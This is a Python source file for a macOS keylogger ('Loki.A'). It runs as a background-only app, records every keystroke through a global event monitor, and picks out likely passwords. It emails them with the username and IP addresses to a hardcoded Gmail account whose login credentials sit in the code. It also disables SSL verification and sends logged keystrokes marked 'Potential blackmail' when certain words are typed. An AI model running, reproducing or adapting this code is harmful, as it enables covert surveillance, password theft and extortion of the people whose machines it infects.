# ====== KEYLOGGER ====== #


# == SETUP == #

# Modules
import os, sys # System
from AppKit import NSApplication, NSApp
from Foundation import NSObject
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper
from PyQt5 import QtCore, QtWidgets
import keyboard as kb
import socket
import pathlib
from multiprocessing import Process
import smtplib
from json import load
from urllib.request import urlopen, Request
import ssl
from AppKit import NSBundle
app_info = NSBundle.mainBundle().infoDictionary()
app_info["LSBackgroundOnly"] = "1"

# Create text files
f = open ("/Users/Shared/Loki.A/word.txt", "w")
f.write ('')
f.close ()

# Variables
Password = "" # Suspected password
word = "" # Current word
IP = "" # IP
Path = "/Users/Shared/Loki.A/"

# IP Retrieval
s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
s.connect (("8.8.8.8", 80))
IP = s.getsockname()[0]
s.close ()


# == KEYLOGGING == #

class AppDelegate(NSObject):
    '''
    The App Delegate creates a mask to detect the key being pressed and adds
    a global monitor for this mask.
    '''
    def applicationDidFinishLaunching_(self, notification):
        mask_down = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask_down, key_handler)

class Writer:
    '''
    This class contains the methods necessary to create an output file and write
    the collected keystrokes to that file.
    '''
    
    # Setup
    def __init__(self):
        self.path = self.create_log()
        self.leng = 0

    # Create overall keylogging file
    def create_log(self):
        filepath = Path + "O_K.txt"
        f = open (filepath, 'w+')
        f.close()
        return filepath

    # Write to O_K file + Current Word file
    def write_to_log(self, value_char):
        self.leng += 1
        
        with open(Path + "O_K.txt", 'a') as f:
            f.write (value_char)

        with open (Path + "word.txt", 'a') as f:
            f.write (value_char)

w = Writer() # Variable simplication

def key_handler(event):
    '''
    Translates the key press events into readable characters if one exists
    the key code is also recorded for non-character input.
    '''
    try:
        capture_char = event.characters() # Key character [a]
        capture_raw = event.keyCode() # Key code [32]

        print (str (capture_char))
        w.write_to_log (capture_char) # Append to O_K file
        
        if capture_raw == 51:
            with open(Path + "O_K.txt", 'rb+') as filehandle:
                filehandle.seek(-2, os.SEEK_END)
                filehandle.truncate()
            with open(Path + 'word.txt', 'rb+') as filehandle:
                filehandle.seek(-2, os.SEEK_END)
                filehandle.truncate()
        
        if capture_raw == 36 or capture_raw == 49: # Word is complete [Space/Enter pressed]
            # Determine completed word from text file
            f = open (Path + 'word.txt', 'r')
            word = str (f.read ())
            print (word)
            f.close ()
            f = open (Path + 'word.txt', 'w')
            f.write ('')
            f.close ()

            def sendMail (subject, message):
                print ("Sending text...")
                if (not os.environ.get('PYTHONHTTPSVERIFY', '') and
                getattr(ssl, '_create_unverified_context', None)):
                    ssl._create_default_https_context = ssl._create_unverified_context

                from email.mime.multipart import MIMEMultipart
                from email.mime.text import MIMEText
                
                msg = MIMEMultipart()
                msg['From'] = '403.th3ta@gmail.com'
                msg['To'] = '403.th3ta@gmail.com'
                msg['Subject'] = subject
                msg.attach(MIMEText(message))

                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                server.login("403.th3ta@gmail.com", "unosryrgbvyjrxib")
                server.sendmail(
                  "403.th3ta@gmail.com", 
                  "403.th3ta@gmail.com", 
                  msg.as_string ())
                server.quit()

            # Password classification + identification
            rules = [lambda word: any(x.islower() for x in word),  # must have at least one lowercase
                lambda word: any(x.isdigit() for x in word),  # must have at least one digit
                lambda word: len(word) >= 7                   # must be at least 7 characters
                ]
            
            if all (rule (word) for rule in rules): # If word fits criteria
                Password = word # Set password
                url = "http://jsonip.com"
                request_site = Request(url, headers={"User-Agent": "Mozilla/5.0"})
                ipv6 = load (urlopen (request_site))['ip']
                import getpass
                user = getpass.getuser()
                p = Process(target=sendMail, args=("Potential password", str (user + '\n' + Password + '\n' + ipv6 + '\n' + IP)))
                p.daemon = True
                p.start()
                #SendInfo.send (Password + '\n' + IP, "Potential password") # Send email through SendEmail.py

            auxiliary = [" ", "\n", ".", "!", "ing", "?", ",", "ed"]
            with open(Path + 'bad_words.txt') as f:
                temp_word = word
                for aux in auxiliary:
                    altered_word = temp_word.replace (aux, "")
                    #print (altered_word)
                    temp_word = altered_word
                #print (temp_word)
                f_lines = f.readlines ()
                for line in f_lines:
                    line = line.strip ()
                    if line in temp_word:
                        with open (Path + 'O_K.txt', 'r') as h:
                            words = h.read ()
                            p = Process(target=sendMail, args=("Potential blackmail", words))
                            p.daemon = True
                            p.start()
                            #SendInfo.send (words, "Potential blackmail")

                with open (Path + "O_K.txt") as j:
                    chars = j.read()
                    num_chars = len (chars)
                    if num_chars > 250:
                        N = 250
                        str_total = ""
                        while N > 0:
                            str_comb = chars [-N]
                            str_total = str_total + str_comb
                            N = N - 1
                        with open(Path + "O_K.txt", 'w') as k:
                            k.write (str_total)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

app = NSApplication.sharedApplication()
delegate = AppDelegate.alloc().init()
NSApp().setDelegate_(delegate)
AppHelper.runEventLoop()
